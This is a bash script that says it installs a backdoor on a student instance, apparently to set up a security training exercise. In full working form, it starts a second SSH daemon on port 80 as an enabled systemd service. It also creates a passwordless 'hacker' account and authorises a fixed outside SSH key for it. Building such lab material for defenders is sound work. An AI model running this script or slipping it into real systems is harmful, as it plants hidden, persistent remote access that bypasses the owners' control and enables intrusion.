#!/bin/bash
#
# install a backdoor on the student instance

# Create port80 config file
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd80_config
sudo sed -i 's/#Port 22/Port 80/' /etc/ssh/sshd80_config

# Create port80 service
sudo cp /lib/systemd/system/ssh.service /lib/systemd/system/ssh80.service
sudo sed -i 's|^Description=OpenBSD Secure Shell server|Description=OpenBSD Secure Shell server on port 80|' /lib/systemd/system/ssh80.service
sudo sed -i 's|^ExecStart=.*|ExecStart=/usr/sbin/sshd -D -f /etc/ssh/sshd80_config|' /lib/systemd/system/ssh80.service
sudo sed -i 's|^Alias=sshd.service|Alias=sshd80.service|' /lib/systemd/system/ssh80.service


sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl start ssh80
sudo systemctl enable ssh80

# Will this be obvious enough for the students?

# Create the hacker user
sudo adduser --quiet --disabled-password --gecos hacker hacker
sudo mkdir -p /home/hacker/.ssh
sudo chmod 700 /home/hacker/.ssh
sudo chown hacker:hacker /home/hacker/.ssh

# Give the hacker the hacker key
sudo cp /home/ubuntu/.ssh/authorized_keys /home/hacker/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJf1hjU/vrqVZeNzaJcRhtPO6C5gWdCpEtCwVYmmqeuz hacker" | sudo tee -a /home/hacker/.ssh/authorized_keys > /dev/null
sudo chown hacker:hacker /home/hacker/.ssh/authorized_keys
sudo chmod 600 /home/hacker/.ssh/authorized_keys
